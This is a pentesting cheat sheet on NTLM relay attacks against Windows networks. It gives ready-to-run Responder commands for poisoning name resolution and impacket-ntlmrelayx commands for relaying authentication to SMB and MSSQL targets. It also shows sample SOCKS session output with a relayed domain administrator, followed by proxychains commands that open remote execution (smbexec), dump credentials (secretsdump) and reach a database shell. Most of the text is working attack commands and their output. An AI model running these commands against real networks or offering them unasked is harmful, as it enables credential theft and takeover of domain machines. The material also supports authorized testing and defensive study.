# NTLM relay

## Questions to ask yourself
  *  What services will accept NTLM authentication?
  *  What other users/services/machines have access to the target service?

## Things to remember
  *  Relay victim account must have permissions for the target service (duh)
  *  Any service that supports NTLM can be a target
  *  This technique can be applied in many different places, see EFSRPC call in [`PetitPotam`](https://github.com/topotam/PetitPotam)

## Useful tools
  *  [`Responder`](https://github.com/lgandx/Responder) for poisoning name resolution
  *  [`impacket-ntlmrelayx`](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) for performing NTLM relay

## Name poisoning
  *  `Responder` for poisoning broadcast name resolution protocols (NetBIOS, LLMNR, mDNS, etc.)
      *  Poisoning name resolution will coerce victims to authenticate to the relay
      *  SMB/HTTP must be `off` in `Responder.conf` to use `impacket-ntlmrelayx`

```
responder -I eth0
responder -I eth0 -wv
```

## NTLM relaying
  *  `impacket-ntlmrelayx` for handling relay once victim initiates auth
      *  Dumps credentials from target machine by default
      *  Open proxy (port 1080) to leverage session gained via relay
      *  Various cross-protocol NTLM relays also supported

```
impacket-ntlmrelayx -t CLIENT02.example.com -smb2support
```

```
impacket-ntlmrelayx -t 10.0.0.1 -smb2support -socks
...
ntlmrelayx> socks
Protocol  Target       Username            AdminStatus  Port 
--------  -----------  ------------------  -----------  ----
SMB       10.0.0.1     CORP/ADMINISTRATOR  TRUE         445
...
proxychains impacket-smbexec CORP/Administrator@10.0.0.1
proxychains impacket-secretsdump CORP/Administrator@10.0.0.1
```

```
impacket-ntlmrelayx -t mssql://10.0.0.1 -socks -smb2support
...
ntlmrelayx> socks
Protocol  Target       Username            AdminStatus  Port 
--------  -----------  ------------------  -----------  ----
MSSQL     10.0.0.1     CORP/ADMINISTRATOR  N/A          1433
...
proxychains impacket-mssqlclient CORP/Administrator@10.0.0.1 -windows-auth
```
